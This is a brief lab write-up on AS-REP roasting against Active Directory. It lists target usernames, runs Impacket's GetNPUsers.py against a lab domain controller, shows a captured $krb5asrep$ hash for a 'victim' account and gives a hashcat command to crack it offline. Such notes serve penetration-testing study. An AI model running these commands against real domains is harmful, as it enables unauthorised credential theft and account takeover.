**AS-REP Roasting**

Is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "**Do not require Kerberos pre-authentication"**. This option relies on the old Kerberos authentication protocol, which allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!

![81bf1dad6425f8f06b0026f4e748f193](https://github.com/user-attachments/assets/2ccdf90a-420f-45dd-8c55-8f1142276804)

We should do some recon to obtain the AD users and collect them in a file ```users.txt```:
```
Administrator
admin
thm
test
sshd
victim
CREDS-HARVESTIN$
```
 ```
GetNPUsers.py -dc-ip <DomainController_IP> <domain>/<user> -usersfile <path_to_users_file>
```
**ex**
```
GetNPUsers.py -dc-ip 10.10.73.127 thm.red/thm -usersfile users.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$victim@THM.RED:269af6bae34fa24f66669f64454eb290$95c86c6aad2085a6f0263c92587a1bee24d04e13e74e5c510d7b17287ce772553f28f5fe1306cda7ba06db1c0fede4c09c8e3e8fec0bebfd85c47ded661f54c686216c296ae99d6b389eaa7bbb1b12b85347fee45574d39a4ca2e5f157bb732472d4614787e4204ac82adcee530d4a6a9ab2da7775d06922f8650468826c329bbf4e86c9f6be04d5ff54790a098a09bbc2500659c834c96e4a90ba6e042855eaa1672645f8620abea4f7fb43322624c6950b990fc247f08be8a098adf9920e22c5f7310fe7b710def9b071472c2440629bedc226dc6fadff2e20727bc467e543f6c8
[-] User CREDS-HARVESTIN$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```


The ```GetNPUsers.py``` is used to request Kerberos **TGTs** for user accounts that have the **"Do not require Kerberos preauthentication"**

<br>

**Cracking the AS-REP Hash:**

To crack the AS-REP hash, you can use Hashcat with the following command:
```
hashcat -m 18200 hash.txt /path/to/rockyou.txt
```





























